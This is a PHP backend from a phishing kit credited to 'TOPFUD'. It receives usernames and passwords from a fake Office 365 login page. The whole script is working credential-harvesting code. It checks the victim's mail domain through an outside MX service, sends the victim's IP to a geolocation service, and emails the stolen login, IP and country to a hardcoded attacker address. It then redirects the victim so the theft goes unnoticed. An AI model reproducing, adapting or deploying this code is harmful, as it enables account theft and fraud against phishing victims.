<?php
// THIS SCRIPT CODED BY TOPFUD.com
// Skype : TOPFUD@hotmail.com ,, live:.cid.f3ca894e49395bbe
// ICQ : 624088694
// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
// !!!!!!!!!!!! Attention !!!!!!!!!!!!
// !!!! IF NOT WORKING CONTACT US  !!!
// !!!! IF NOT WORKING CONTACT US  !!!
// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!


$recipient = "dreamlogz231@hotmail.com"; // Replace your email id here
$over = 'https://office365.com';






// *****************************************************//
if(isset($_POST['user']) && isset($_POST['pass'])){
function check_mx($user)
{
$domain = substr(strrchr($user, "@") , 1);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "http://mx-api.com/mx/mx.api?domain=$domain");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$mx = curl_exec($ch);
return $mx;
}
function visitor_country($ip){
$ip['ip'] = getenv("REMOTE_ADDR");
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://showips.com/api/geoip/");
curl_setopt($ch, CURLOPT_POST ,TRUE); 
curl_setopt ($ch, CURLOPT_POSTFIELDS, http_build_query($ip)); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
return $result = json_decode(curl_exec($ch), true);
}
$check = check_mx($_POST['user']);
$ip = getenv("REMOTE_ADDR");
if (stripos($check, "outlook") !== false)
{
$user = $_POST['user'];
$pass = $_POST['pass'];
$data = $_POST;
if (strpos($_POST['user'], "@hotmail") == true || strpos($_POST['user'], "@live") == true)
        {
         $data['t'] = 0;
        }
        else
        {
         $data['t'] = 1;
        }
$res = visitor_country($data);
if($res['status'] == 'OK'){
$message = "-----------------+OFFICE365 Results True Login Verfied  +-----------------\n";
$message.= "User ID: " . $user . "\n";
$message.= "Password: " . $pass . "\n";
$message.= "Client IP      : $ip\n";
$message.= "Client Country      : " . $res['country'] . "\n";
$message.= "-----------------+ Created by Topfud-com+------------------\n";
$subject = "OFFICE 365 | Results True Login: " . $ip . "\n";
$headers = "MIME-Version: 1.0\n";
mail($recipient, $subject, $message, $headers);
header("Location: $over");
}else{
	header("Location: thanks.html?email=$user&.rand=13InboxLight.aspx?n=1774256418&fid=4#n=1252899642&fid=1&fav=1");
}
}else{
$user = $_POST['user'];
$pass = $_POST['pass'];
$data = $_POST;
$data['t'] = '0';
$res = visitor_country($data);
$message = "-----------------+ Results  +-----------------\n";
$message.= "User ID: " . $user . "\n";
$message.= "Password: " . $pass . "\n";
$message.= "Client IP      : $ip\n";
$message.= "Client Country      : " . $res['country'] . "\n";
$message.= "-----------------+ Created by Topfud-com+------------------\n";
$subject = " Results !! : " . $ip . "\n";
$headers = "MIME-Version: 1.0\n";
mail($recipient, $subject, $message, $headers);
header("Location: thanks.html?email=$user&.rand=13InboxLight.aspx?n=1774256418&fid=4#n=1252899642&fid=1&fav=1");
}
}
?>
